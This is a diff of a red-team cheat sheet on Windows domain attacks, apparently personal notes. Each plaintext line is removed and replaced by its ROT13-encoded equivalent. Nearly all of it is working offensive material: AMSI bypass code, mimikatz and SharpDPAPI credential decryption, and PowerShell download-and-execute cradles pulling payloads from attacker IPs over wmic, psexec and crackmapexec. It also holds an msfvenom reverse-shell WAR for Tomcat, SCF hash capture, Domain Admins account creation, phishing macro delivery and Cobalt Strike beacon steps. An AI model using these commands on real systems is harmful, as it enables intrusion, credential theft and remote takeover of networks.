@@ -1,429 +1,431 @@
-GhostPack Tools
-  SharpGPOAbuse.exe GPO modificatino tool
-  Seatbelt.exe -group=all -full -outputfile="c:\windows\temp\out.txt"
-  SharpUp.exe (Privesc Tool)
-  SharpDump.exe (LSASS MiniDump Tool)
-  SharpView.exe (Network Enumeration) (Use module -Help to get syntax)
-    - Exmaple: SharpView.exe Get-NetLoggedon localhost
-    - PowerView Examples: https://powersploit.readthedocs.io/en/latest/Recon
-  SharpHound.exe -c All,GPOLocalGroup --windowsonly --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties  --throttle 10000 --jitter 23
-    - Jitter is in milliseconds; 10000 = 10 seconds
-  Rubeus.exe (Kerberose Tool)
-  SharpDPAPI.exe
-    - DA: SharpDPAPI backupkey /server:dc01.fqdn /file:keyname.pvk (file is optional; base64 without)
-    - System: SharpDPAPI machinetriage
-    - User Get Key: mimikatz @dpapi::masterkey /in:”C:\Users\dfm.a\AppData\Roaming\Microsoft\Protect\S-1-5-21-883232822-274137685-4173207997-1110\ca748af3-8b95-40ae-8134-cb9534762688″ /rpc
-    - User Decrypt Mimikatz: mimikazt @dpapi::cred /in:"C:\Users\s.bowers\AppData\Local\Microsoft\Credentials\5DD604C1E108746934B92E2A20318758" /masterkey:REDACTED
-    - User Decrypt Rubeus: SharpDPAPI traiage /pvk:key.pvk or /pvk:Base64
+TubfgCnpx Gbbyf
+  FunecTCBNohfr.rkr TCB zbqvsvpngvab gbby
+  Frngoryg.rkr -tebhc=nyy -shyy -bhgchgsvyr="p:\jvaqbjf\grzc\bhg.gkg"
+  FunecHc.rkr (Cevirfp Gbby)
+  FunecQhzc.rkr (YFNFF ZvavQhzc Gbby)
+  FunecIvrj.rkr (Argjbex Rahzrengvba) (Hfr zbqhyr -Uryc gb trg flagnk)
+    - Rkzncyr: FunecIvrj.rkr Trg-ArgYbttrqba ybpnyubfg
+    - CbjreIvrj Rknzcyrf: uggcf://cbjrefcybvg.ernqgurqbpf.vb/ra/yngrfg/Erpba
+  FunecUbhaq.rkr -p Nyy,TCBYbpnyTebhc --jvaqbjfbayl --bhgchgqverpgbel P:\Jvaqbjf\Grzc --enaqbzvmrsvyranzrf --cergglwfba --abfnirpnpur --rapelcgmvc --pbyyrpgnyycebcregvrf  --guebggyr 10000 --wvggre 23
+    - Wvggre vf va zvyyvfrpbaqf; 10000 = 10 frpbaqf
+  Ehorhf.rkr (Xreorebfr Gbby)
+  FunecQCNCV.rkr
+    - QN: FunecQCNCV onpxhcxrl /freire:qp01.sdqa /svyr:xrlanzr.cix (svyr vf bcgvbany; onfr64 jvgubhg)
+    - Flfgrz: FunecQCNCV znpuvargevntr
+    - Hfre Trg Xrl: zvzvxngm @qcncv::znfgrexrl /va:”P:\Hfref\qsz.n\NccQngn\Ebnzvat\Zvpebfbsg\Cebgrpg\F-1-5-21-883232822-274137685-4173207997-1110\pn748ns3-8o95-40nr-8134-po9534762688″ /ecp
+    - Hfre Qrpelcg Zvzvxngm: zvzvxnmg @qcncv::perq /va:"P:\Hfref\f.objref\NccQngn\Ybpny\Zvpebfbsg\Perqragvnyf\5QQ604P1R108746934O92R2N20318758" /znfgrexrl:ERQNPGRQ
+    - Hfre Qrpelcg Ehorhf: FunecQCNCV genvntr /cix:xrl.cix be /cix:Onfr64
     
-  AMSIBypass - Rastamouse
-    - [System.Reflection.Assembly]::LoadFile("D:\Tools\ASBBypass\ASBBypass\bin\Release\ASBBypass.dll")
-    - [Amsi]::Bypass()
-    Poweshell AMSI Bypass
-       (([Ref].Assembly.gettypes() | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQAqAHQAaQBsAHMA')))}).GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))) | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0ACoAYQBpAGwAZQBkAA==')))}).SetValue($null,$true)
-    AMSI Bypass Script
-        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUt' + 'ils')
-        $h = "4456625220575263174452554847"
-        $s = [string](0..13|%{[char][int](53+($h).substring(($_*2),2))})-replace " "
-        $b = $a.GetField($s, 'NonPublic,Static')
-        $b.SetValue($null,$true)
+  NZFVOlcnff - Enfgnzbhfr
+    - [Flfgrz.Ersyrpgvba.Nffrzoyl]::YbnqSvyr("Q:\Gbbyf\NFOOlcnff\NFOOlcnff\ova\Eryrnfr\NFOOlcnff.qyy")
+    - [Nzfv]::Olcnff()
+    Cbjrfuryy NZFV Olcnff
+       (([Ers].Nffrzoyl.trgglcrf() | ? {$_.Anzr -yvxr $([Grkg.Rapbqvat]::Havpbqr.TrgFgevat([Pbaireg]::SebzOnfr64Fgevat('DDOgNUZNnDNdNUDNnDOfNUZN')))}).TrgSvryqf($([Grkg.Rapbqvat]::Havpbqr.TrgFgevat([Pbaireg]::SebzOnfr64Fgevat('GtOiNT4NHNO1NTVNoNOcNTZNYNOGNUDNLDO0NTxNLjN=')))) | ? {$_.Anzr -yvxr $([Grkg.Rapbqvat]::Havpbqr.TrgFgevat([Pbaireg]::SebzOnfr64Fgevat('LDOgNUZNnDOWNT4NnDO0NPbNLDOcNTjNMDOxNN==')))}).FrgInyhr($ahyy,$gehr)
+    NZFV Olcnff Fpevcg
+        $n = [Ers].Nffrzoyl.TrgGlcr('Flfgrz.Znantrzrag.Nhgbzngvba.NzfvHg' + 'vyf')
+        $u = "4456625220575263174452554847"
+        $f = [fgevat](0..13|%{[pune][vag](53+($u).fhofgevat(($_*2),2))})-ercynpr " "
+        $o = $n.TrgSvryq($f, 'AbaChoyvp,Fgngvp')
+        $o.FrgInyhr($ahyy,$gehr)
     
-Bloodhound/Neo4J
-  # FIND SPN WITH DOMAIN ADMIN
-  MATCH (u:User {hasspn: true})
-  MATCH (G:Group {name: 'DOMAIN ADMINS@DOMAIN.COM'})
-  MATCH p = shortestPath ((u)-[*1..]->(g))
-  RETURN u.name,LENGTH(P)
-  ORDER BY LENGTH(p) ASC
+Oybbqubhaq/Arb4W
+  # SVAQ FCA JVGU QBZNVA NQZVA
+  ZNGPU (h:Hfre {unffca: gehr})
+  ZNGPU (T:Tebhc {anzr: 'QBZNVA NQZVAF@QBZNVA.PBZ'})
+  ZNGPU c = fubegrfgCngu ((h)-[*1..]->(t))
+  ERGHEA h.anzr,YRATGU(C)
+  BEQRE OL YRATGU(c) NFP
 
-  # FIND SPN ORDER BY ADMIN ACCESS
-  MATCH (u: User {hasspn: true})
-  OPTIONAL MATCH (u)-[:AdminTo]->(c1:Computer)
-  OPTIONAL MATCH (u)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c2:Computer)
-  WITH u,COLLECT(c1) + COLLECT(c2) AS tempVar
-  UNWIND tempVar AS comps
-  RETURN u.name,COUNT(DISTINCT(comps))
-  ORDER BY COUNT(DISTINCT(comps)) DESC
+  # SVAQ FCA BEQRE OL NQZVA NPPRFF
+  ZNGPU (h: Hfre {unffca: gehr})
+  BCGVBANY ZNGPU (h)-[:NqzvaGb]->(p1:Pbzchgre)
+  BCGVBANY ZNGPU (h)-[:ZrzoreBs*1..]->(:Tebhc)-[:NqzvaGb]->(p2:Pbzchgre)
+  JVGU h,PBYYRPG(p1) + PBYYRPG(p2) NF grzcIne
+  HAJVAQ grzcIne NF pbzcf
+  ERGHEA h.anzr,PBHAG(QVFGVAPG(pbzcf))
+  BEQRE OL PBHAG(QVFGVAPG(pbzcf)) QRFP
 
-Set Time/Date: timedatectl set-time 13:05:30
+Frg Gvzr/Qngr: gvzrqngrpgy frg-gvzr 13:05:30
 
-Linux Powershell (Pwsh)
-  Import a module syntax
-  Import-Module .\Invoke-CradleCrafter.psd1; Invoke-CradleCrafter
+Yvahk Cbjrefuryy (Cjfu)
+  Vzcbeg n zbqhyr flagnk
+  Vzcbeg-Zbqhyr .\Vaibxr-PenqyrPensgre.cfq1; Vaibxr-PenqyrPensgre
   
-Powershell Encoding (AMSI Bypass)
-  Base64: 
-    $malicious = "am" + "siutils"
-    [Convert]::ToBase64String([Text.encoding]::UTF8.GetBytes($malicious))
-  Encrypted:
-    $malicious = "am" + "siutils"
-    $encrypted = @()
-    $decrypted = @()
-    foreach($byte in [Text.Encoding]::UTF8.GetBytes($malicious)){ $encrypted += $byte -bxor 1 }
-    [Test.Encoding]::UTF8.GetString($decrypted)
+Cbjrefuryy Rapbqvat (NZFV Olcnff)
+  Onfr64: 
+    $znyvpvbhf = "nz" + "fvhgvyf"
+    [Pbaireg]::GbOnfr64Fgevat([Grkg.rapbqvat]::HGS8.TrgOlgrf($znyvpvbhf))
+  Rapelcgrq:
+    $znyvpvbhf = "nz" + "fvhgvyf"
+    $rapelcgrq = @()
+    $qrpelcgrq = @()
+    sbernpu($olgr va [Grkg.Rapbqvat]::HGS8.TrgOlgrf($znyvpvbhf)){ $rapelcgrq += $olgr -okbe 1 }
+    [Grfg.Rapbqvat]::HGS8.TrgFgevat($qrpelcgrq)
   
-Poweshell Contrained Language Mode
-  Put Beacon on disk and run the following
-  forfile /p C:\Windows\System32 /m calc.exe /c 'path_to_beacon.exe'
-  example: forfile /p C:\Windows\System32 /m ping.exe /c 'c:\windows\temp\beacon.exe'
+Cbjrfuryy Pbagenvarq Ynathntr Zbqr
+  Chg Ornpba ba qvfx naq eha gur sbyybjvat
+  sbesvyr /c P:\Jvaqbjf\Flfgrz32 /z pnyp.rkr /p 'cngu_gb_ornpba.rkr'
+  rknzcyr: sbesvyr /c P:\Jvaqbjf\Flfgrz32 /z cvat.rkr /p 'p:\jvaqbjf\grzc\ornpba.rkr'
   
-Antivirus Info
-  WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
+Nagvivehf Vasb
+  JZVP /Abqr:ybpnyubfg /Anzrfcnpr:\\ebbg\FrphevglPragre2 Cngu NagvivehfCebqhpg Trg qvfcynlAnzr
 
-Mimikatz DPAPI
-* https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/
-* https://ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++
-  Credential files for SYSTEM: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials (Vaults, etc..)
-  Credential files for USERS: C:\Users\user\AppData\Local\Microsoft\Credentials\ (Vaults, etc..)
-      Example: c:\users\epugh\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9
-  Get masterkey GUID
-      mimikatz dpapi::cred /in:c:\users\epugh\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9
-      Example:  guidMasterKey : {7dc6a492-36e2-4c2d-be66-ba29d263dda2}
-  Check if decrypted masterkey is in LSASS
-       mimikatz !sekurlsa::dpapi
-  Locate encrypted masterkey if not in lsass
-      Encrypted masterkeys are located at: c:\users\username\AppData\Roaming\Microsoft\Protect\
-      Example: c:\users\epugh\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-1151\7dc6a492-36e2-4c2d-be66-ba29d263dda2
-  Decrypte masterkey
-      mimikatz dpapi::masterkey /in:"c:\users\epugh\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-1151\7dc6a492-36e2-4c2d-be66-ba29d263dda2" /rpc
-      or
-      mimikatz dpapi::masterkey /in:"c:\users\epugh\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-1151\7dc6a492-36e2-4c2d-be66-ba29d263dda2" /sids:S-1-5-21-1396373213-2872852198-2033860859-1151 /password:Sarah2017 /protected
-      Copy masterkey; key : dcd70638e50e3bcec7cd7fb888399748.......
-  Decrypt Credential File
-      mimikatz dpapi::cred /in:c:\users\epugh\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9 /masterkey:dcd70638e50e3bcec7cd7fb8......
+Zvzvxngm QCNCV
+* uggcf://enfgnzbhfr.zr/2017/08/whzcvat-argjbex-frtertngvba-jvgu-eqc/
+* uggcf://verq.grnz/bssrafvir-frphevgl/perqragvny-npprff-naq-perqragvny-qhzcvat/ernqvat-qcncv-rapelcgrq-frpergf-jvgu-zvzvxngm-naq-p++
+  Perqragvny svyrf sbe FLFGRZ: P:\Jvaqbjf\Flfgrz32\pbasvt\flfgrzcebsvyr\NccQngn\Ybpny\Zvpebfbsg\Perqragvnyf (Inhygf, rgp..)
+  Perqragvny svyrf sbe HFREF: P:\Hfref\hfre\NccQngn\Ybpny\Zvpebfbsg\Perqragvnyf\ (Inhygf, rgp..)
+      Rknzcyr: p:\hfref\rchtu\NccQngn\Ybpny\Zvpebfbsg\Perqragvnyf\936N68O5NP87P545P4N22Q1NS264P8R9
+  Trg znfgrexrl THVQ
+      zvzvxngm qcncv::perq /va:p:\hfref\rchtu\NccQngn\Ybpny\Zvpebfbsg\Perqragvnyf\936N68O5NP87P545P4N22Q1NS264P8R9
+      Rknzcyr:  thvqZnfgreXrl : {7qp6n492-36r2-4p2q-or66-on29q263qqn2}
+  Purpx vs qrpelcgrq znfgrexrl vf va YFNFF
+       zvzvxngm !frxheyfn::qcncv
+  Ybpngr rapelcgrq znfgrexrl vs abg va yfnff
+      Rapelcgrq znfgrexrlf ner ybpngrq ng: p:\hfref\hfreanzr\NccQngn\Ebnzvat\Zvpebfbsg\Cebgrpg\
+      Rknzcyr: p:\hfref\rchtu\NccQngn\Ebnzvat\Zvpebfbsg\Cebgrpg\F-1-5-21-1396373213-2872852198-2033860859-1151\7qp6n492-36r2-4p2q-or66-on29q263qqn2
+  Qrpelcgr znfgrexrl
+      zvzvxngm qcncv::znfgrexrl /va:"p:\hfref\rchtu\NccQngn\Ebnzvat\Zvpebfbsg\Cebgrpg\F-1-5-21-1396373213-2872852198-2033860859-1151\7qp6n492-36r2-4p2q-or66-on29q263qqn2" /ecp
+      be
+      zvzvxngm qcncv::znfgrexrl /va:"p:\hfref\rchtu\NccQngn\Ebnzvat\Zvpebfbsg\Cebgrpg\F-1-5-21-1396373213-2872852198-2033860859-1151\7qp6n492-36r2-4p2q-or66-on29q263qqn2" /fvqf:F-1-5-21-1396373213-2872852198-2033860859-1151 /cnffjbeq:Fnenu2017 /cebgrpgrq
+      Pbcl znfgrexrl; xrl : qpq70638r50r3oprp7pq7so888399748.......
+  Qrpelcg Perqragvny Svyr
+      zvzvxngm qcncv::perq /va:p:\hfref\rchtu\NccQngn\Ybpny\Zvpebfbsg\Perqragvnyf\936N68O5NP87P545P4N22Q1NS264P8R9 /znfgrexrl:qpq70638r50r3oprp7pq7so8......
       
   
-PowerView
-  Trusts: Get-DomainTrust -SearchBase “GC://$($ENV:USERDNSDOMAIN)”
-  Trust Mapping: Get-DomainTrustMapping to | Export-CSV -NoTypeInformation trusts.csv
-  Change User PW: powerpick $newpwd = ConvertTo-SecureString -String "Password1!" -AsPlainText –Force; Set-DomainUserPassword -Identity <username> -AccountPassword $newpwd
-  Change ACL Perms: Add-DomainObjectAcl -TargetIdentity <domain|user|computer> -PrincipalIdentity <user|computer> -Rights <DCSync|All> -Verbose
+CbjreIvrj
+  Gehfgf: Trg-QbznvaGehfg -FrnepuOnfr “TP://$($RAI:HFREQAFQBZNVA)”
+  Gehfg Znccvat: Trg-QbznvaGehfgZnccvat gb | Rkcbeg-PFI -AbGlcrVasbezngvba gehfgf.pfi
+  Punatr Hfre CJ: cbjrecvpx $arjcjq = PbairegGb-FrpherFgevat -Fgevat "Cnffjbeq1!" -NfCynvaGrkg –Sbepr; Frg-QbznvaHfreCnffjbeq -Vqragvgl <hfreanzr> -NppbhagCnffjbeq $arjcjq
+  Punatr NPY Crezf: Nqq-QbznvaBowrpgNpy -GnetrgVqragvgl <qbznva|hfre|pbzchgre> -CevapvcnyVqragvgl <hfre|pbzchgre> -Evtugf <QPFlap|Nyy> -Ireobfr
 
-Password Crack Examples
-  JTR: john --format=netntlmv2 --wordlist=/usr/share/wordlist/rockyou hash_file.txt
-  HASHCAT: Hashcat -a0 -w3 -m1000 /path/to/hashes /path/to/dictionary [-r rules file]
-    * a = dictionary attack; w3 = almost all processing hardware; m = hash type - 1000 is NTLM
+Cnffjbeq Penpx Rknzcyrf
+  WGE: wbua --sbezng=argagyzi2 --jbeqyvfg=/hfe/funer/jbeqyvfg/ebpxlbh unfu_svyr.gkg
+  UNFUPNG: Unfupng -n0 -j3 -z1000 /cngu/gb/unfurf /cngu/gb/qvpgvbanel [-e ehyrf svyr]
+    * n = qvpgvbanel nggnpx; j3 = nyzbfg nyy cebprffvat uneqjner; z = unfu glcr - 1000 vf AGYZ
 
-MSBuild Beacon
-  MSBuild 3gStudent:
-    Download XML from: https://github.com/3gstudent/msbuild-inline-task
-    Generate Shellcode from Cobalt (C#) and place the shellcode in the XML from new_byte...};
-    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\host.domain\path\to\XMLfile.xml
-  Powershell IEX
-    "powershell iex (new-object net.webclient).downloadstring('http://10.10.10.10/update')"
-    sudo crackmapexec smb 10.10.5.30 --obfs -u username -p='password' -x "powershell.exe -version 3 -c IEX ([net.webclient]::new().downloadstring('http://10.10.5.13:80/update'))"
-    Upload exe and execute
-        iwr -uri http://10.10.5.13/myfile -outfile c:\windows\temp\test.exe
-        crackmapexec smb 10.10.5.30 -u username -p password -X 'powershell.exe -version 3 iwr -uri http://10.10.5.13/myfile -outfile c:\windows\temp\test.exe'
-        c:\windows\temp\test.exe
+ZFOhvyq Ornpba
+  ZFOhvyq 3tFghqrag:
+    Qbjaybnq KZY sebz: uggcf://tvguho.pbz/3tfghqrag/zfohvyq-vayvar-gnfx
+    Trarengr Furyypbqr sebz Pbonyg (P#) naq cynpr gur furyypbqr va gur KZY sebz arj_olgr...};
+    P:\Jvaqbjf\Zvpebfbsg.ARG\Senzrjbex64\i4.0.30319\ZFOhvyq.rkr \\ubfg.qbznva\cngu\gb\KZYsvyr.kzy
+  Cbjrefuryy VRK
+    "cbjrefuryy vrk (arj-bowrpg arg.jropyvrag).qbjaybnqfgevat('uggc://10.10.10.10/hcqngr')"
+    fhqb penpxzncrkrp fzo 10.10.5.30 --bosf -h hfreanzr -c='cnffjbeq' -k "cbjrefuryy.rkr -irefvba 3 -p VRK ([arg.jropyvrag]::arj().qbjaybnqfgevat('uggc://10.10.5.13:80/hcqngr'))"
+    Hcybnq rkr naq rkrphgr
+        vje -hev uggc://10.10.5.13/zlsvyr -bhgsvyr p:\jvaqbjf\grzc\grfg.rkr
+        penpxzncrkrp fzo 10.10.5.30 -h hfreanzr -c cnffjbeq -K 'cbjrefuryy.rkr -irefvba 3 vje -hev uggc://10.10.5.13/zlsvyr -bhgsvyr p:\jvaqbjf\grzc\grfg.rkr'
+        p:\jvaqbjf\grzc\grfg.rkr
     
-Remote Execute
-  Examples:
-      remote-exec wmi 10.9.15.200 powershell.exe -f c:\windows\temp\beacon.ps1 (stageless PS beacon)
-      powershell.exe -nop -w hidden -c iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')
-      Invoke-WebRequest "http://10.10.16.13/bd" -OutFile "C:\users\public\downloads\bd.exe"
-      Invoke-Command -computername HOSTNAME -scriptblock {"C:\users\public\downloads\bd.exe" -AsJob}
-      powerpick invoke-command -computername corewkt002.core.cyber.local -scriptblock {iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')}
-      powershell iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')
-      shell wmic /node:10.9.15.200 process call create "powershell.exe -nop -w hidden iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')"
-        * PS windows may popup for a second on target
-      psexec \\10.9.15.200 /user:Domain.local\Administrator -s "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -InputFormat None -nop -w hidden -c "iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')"
-      psexec \\10.9.15.200 /user:Domain.local\Administrator -s "C:\Users\user\desktop\beacon.exe"
-      * -s Runs as SYSTEM and -c copies file to C:\Windows on remote system
+Erzbgr Rkrphgr
+  Rknzcyrf:
+      erzbgr-rkrp jzv 10.9.15.200 cbjrefuryy.rkr -s p:\jvaqbjf\grzc\ornpba.cf1 (fgntryrff CF ornpba)
+      cbjrefuryy.rkr -abc -j uvqqra -p vrk (arj-bowrpg arg.jropyvrag).qbjaybnqfgevat('uggc://10.10.16.13/plore')
+      Vaibxr-JroErdhrfg "uggc://10.10.16.13/oq" -BhgSvyr "P:\hfref\choyvp\qbjaybnqf\oq.rkr"
+      Vaibxr-Pbzznaq -pbzchgreanzr UBFGANZR -fpevcgoybpx {"P:\hfref\choyvp\qbjaybnqf\oq.rkr" -NfWbo}
+      cbjrecvpx vaibxr-pbzznaq -pbzchgreanzr pberjxg002.pber.plore.ybpny -fpevcgoybpx {vrk (arj-bowrpg arg.jropyvrag).qbjaybnqfgevat('uggc://10.10.16.13/plore')}
+      cbjrefuryy vrk (arj-bowrpg arg.jropyvrag).qbjaybnqfgevat('uggc://10.10.16.13/plore')
+      furyy jzvp /abqr:10.9.15.200 cebprff pnyy perngr "cbjrefuryy.rkr -abc -j uvqqra vrk (arj-bowrpg arg.jropyvrag).qbjaybnqfgevat('uggc://10.10.16.13/plore')"
+        * CF jvaqbjf znl cbchc sbe n frpbaq ba gnetrg
+      cfrkrp \\10.9.15.200 /hfre:Qbznva.ybpny\Nqzvavfgengbe -f "P:\Jvaqbjf\Flfgrz32\JvaqbjfCbjreFuryy\i1.0\cbjrefuryy.rkr" -VachgSbezng Abar -abc -j uvqqra -p "vrk (arj-bowrpg arg.jropyvrag).qbjaybnqfgevat('uggc://10.10.16.13/plore')"
+      cfrkrp \\10.9.15.200 /hfre:Qbznva.ybpny\Nqzvavfgengbe -f "P:\Hfref\hfre\qrfxgbc\ornpba.rkr"
+      * -f Ehaf nf FLFGRZ naq -p pbcvrf svyr gb P:\Jvaqbjf ba erzbgr flfgrz
   
-  CrackMapExec
-    crackmapexec IP_Address -u username -p='password' (Test if you have access)
-    crackmapexec IP -u username -p='password' (--exec-method smbexec) -X 'powershell cmd'
-      - Default exec-method is wmiexec; smbexec will drop as System and wmiexec as user/admin
-    crackmapexec IP -u username -H hash
-  Impacket 
-    python /usr/share/doc/python-impacket/examples/wmiexec.py username:password@10.10.5.11 'cmd /c ipconfig'
-      - wmiexec.py, psexec.py, dcomexec.py, atexec.py (Same syntax as above)
-      - smbexec.py (Attempts to get a shell on the remote system; no command argument)
+  PenpxZncRkrp
+    penpxzncrkrp VC_Nqqerff -h hfreanzr -c='cnffjbeq' (Grfg vs lbh unir npprff)
+    penpxzncrkrp VC -h hfreanzr -c='cnffjbeq' (--rkrp-zrgubq fzorkrp) -K 'cbjrefuryy pzq'
+      - Qrsnhyg rkrp-zrgubq vf jzvrkrp; fzorkrp jvyy qebc nf Flfgrz naq jzvrkrp nf hfre/nqzva
+    penpxzncrkrp VC -h hfreanzr -U unfu
+  Vzcnpxrg 
+    clguba /hfe/funer/qbp/clguba-vzcnpxrg/rknzcyrf/jzvrkrp.cl hfreanzr:cnffjbeq@10.10.5.11 'pzq /p vcpbasvt'
+      - jzvrkrp.cl, cfrkrp.cl, qpbzrkrp.cl, ngrkrp.cl (Fnzr flagnk nf nobir)
+      - fzorkrp.cl (Nggrzcgf gb trg n furyy ba gur erzbgr flfgrz; ab pbzznaq nethzrag)
     
-  LolBin
-    runas /netonly /user:domain\username powershell.exe
-    wmic /node:10.0.0.6 /user:administrator /password:asdfadf process call create "powershell.exe iex (new-object net.webclient).downloadstring('http://10.10.5.10/update')"
-    schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
-    * COPY ANY SYSTEM FILE
-      C:\windows\system32\esentutl.exe /y <source-file> /vss /d <dest-file>
+  YbyOva
+    ehanf /argbayl /hfre:qbznva\hfreanzr cbjrefuryy.rkr
+    jzvp /abqr:10.0.0.6 /hfre:nqzvavfgengbe /cnffjbeq:nfqsnqs cebprff pnyy perngr "cbjrefuryy.rkr vrk (arj-bowrpg arg.jropyvrag).qbjaybnqfgevat('uggc://10.10.5.10/hcqngr')"
+    fpugnfxf /perngr /fp zvahgr /zb 1 /ga "rivygnfx" /ge pnyp /eh "FLFGRZ" /f qp-znagilqnf /h hfre /c cnffjbeq
+    * PBCL NAL FLFGRZ SVYR
+      P:\jvaqbjf\flfgrz32\rfraghgy.rkr /l <fbhepr-svyr> /iff /q <qrfg-svyr>
       
-Phishing Macro XLM 
-    Download https://github.com/FortyNorthSecurity/hot-manchego
-    PS> New-Item blank.xlsm
-    PS> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:EPPlus.dll hot-manchego.cs
-    PS> .\hot-manchego.exe .\blank.xlsm .\vba.txt
-    Deliver xlsm file    
+Cuvfuvat Znpeb KYZ 
+    Qbjaybnq uggcf://tvguho.pbz/SbeglAbeguFrphevgl/ubg-znapurtb
+    CF> Arj-Vgrz oynax.kyfz
+    CF> P:\Jvaqbjf\Zvpebfbsg.ARG\Senzrjbex\i4.0.30319\pfp.rkr /ersrerapr:RCCyhf.qyy ubg-znapurtb.pf
+    CF> .\ubg-znapurtb.rkr .\oynax.kyfz .\ion.gkg
+    Qryvire kyfz svyr    
 
-Apache Tomcat JServ exploit
-    https://ionize.com.au/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol/
-    Install the Dependencies on attack box
-        apt install libapache2-mod-jk 
-        a2enmod proxy_ajp
-    Configure Apache
-        ProxyRequests Off
-        # Only allow localhost to proxy requests
-        <Proxy *>
-        Order deny,allow
-        Deny from all
-        Allow from localhost
-        </Proxy>
-        # Change the IP address in the below lines to the remote servers IP address hosting the Tomcat instance
-        ProxyPass   / ajp://192.168.109.134:8009/
-        ProxyPassReverse   / ajp://192.168.109.134:8009/
-    Start Apache
-        systemctl start apache2
-    Exploit
-        msfvenom -p java/shell_reverse_tcp LHOST=192.168.109.129 LPORT=4444 -f war > shell3.war
-    Start Listener
-    Once uploaded make sure to visit the malicious URL (available in applications list) at least once to cause the WAR to execute.
+Ncnpur Gbzpng WFrei rkcybvg
+    uggcf://vbavmr.pbz.nh/rkcybvgvat-ncnpur-gbzpng-cbeg-8009-hfvat-ncnpur-wfrei-cebgbpby/
+    Vafgnyy gur Qrcraqrapvrf ba nggnpx obk
+        ncg vafgnyy yvoncnpur2-zbq-wx 
+        n2razbq cebkl_nwc
+    Pbasvther Ncnpur
+        CebklErdhrfgf Bss
+        # Bayl nyybj ybpnyubfg gb cebkl erdhrfgf
+        <Cebkl *>
+        Beqre qral,nyybj
+        Qral sebz nyy
+        Nyybj sebz ybpnyubfg
+        </Cebkl>
+        # Punatr gur VC nqqerff va gur orybj yvarf gb gur erzbgr freiref VC nqqerff ubfgvat gur Gbzpng vafgnapr
+        CebklCnff   / nwc://192.168.109.134:8009/
+        CebklCnffErirefr   / nwc://192.168.109.134:8009/
+    Fgneg Ncnpur
+        flfgrzpgy fgneg ncnpur2
+    Rkcybvg
+        zfsirabz -c wnin/furyy_erirefr_gpc YUBFG=192.168.109.129 YCBEG=4444 -s jne > furyy3.jne
+    Fgneg Yvfgrare
+    Bapr hcybnqrq znxr fher gb ivfvg gur znyvpvbhf HEY (ninvynoyr va nccyvpngvbaf yvfg) ng yrnfg bapr gb pnhfr gur JNE gb rkrphgr.
   
-SCF Hash Collection
-    Create a scf file extension with the following contents in a Windows File Share:
-        [Shell]
-        Command=2
-        IconFile=\\192.168.0.12\share\test.ico
-        [Taskbar]
-        Command=ToggleDesktop
-    Start responder: responder -wrf --lm -v -I eth0
+FPS Unfu Pbyyrpgvba
+    Perngr n fps svyr rkgrafvba jvgu gur sbyybjvat pbagragf va n Jvaqbjf Svyr Funer:
+        [Furyy]
+        Pbzznaq=2
+        VpbaSvyr=\\192.168.0.12\funer\grfg.vpb
+        [Gnfxone]
+        Pbzznaq=GbttyrQrfxgbc
+    Fgneg erfcbaqre: erfcbaqre -jes --yz -i -V rgu0
 
-File Share
-  WebDav (Host File over port 80)
-    pip install wsgidav cheroot
-    wsgidav --host=0.0.0.0 --port=80 --root=/tmp
-  SMB Share
-    smbserver.py sharename -smb2support directory path (ie. python smbserver.py -smb2support poop /tmp)
-      - copy files: xcopy \\10.10.10.14\poop\filename.exe
+Svyr Funer
+  JroQni (Ubfg Svyr bire cbeg 80)
+    cvc vafgnyy jftvqni purebbg
+    jftvqni --ubfg=0.0.0.0 --cbeg=80 --ebbg=/gzc
+  FZO Funer
+    fzofreire.cl funeranzr -fzo2fhccbeg qverpgbel cngu (vr. clguba fzofreire.cl -fzo2fhccbeg cbbc /gzc)
+      - pbcl svyrf: kpbcl \\10.10.10.14\cbbc\svyranzr.rkr
   
-Net Commands
-  shell net user username /domain (query domain user)
-  shell net user username password /domain /add (Add User)
-  shell net group "Domain Admins" /domain
-  shell net group "Domain Admins" username /add /domain
+Arg Pbzznaqf
+  furyy arg hfre hfreanzr /qbznva (dhrel qbznva hfre)
+  furyy arg hfre hfreanzr cnffjbeq /qbznva /nqq (Nqq Hfre)
+  furyy arg tebhc "Qbznva Nqzvaf" /qbznva
+  furyy arg tebhc "Qbznva Nqzvaf" hfreanzr /nqq /qbznva
   
-Cobalt-Metasploit
-  Connect MetaSploit to Cobalt Listener
-    msf: set lhost cobalt host
-    msf: set lport cobalt listener (normal https listener)
-    msf: set prependmigrate true
-    msf: set disablepayloadhandler true
-    msf: exploit
+Pbonyg-Zrgnfcybvg
+  Pbaarpg ZrgnFcybvg gb Pbonyg Yvfgrare
+    zfs: frg yubfg pbonyg ubfg
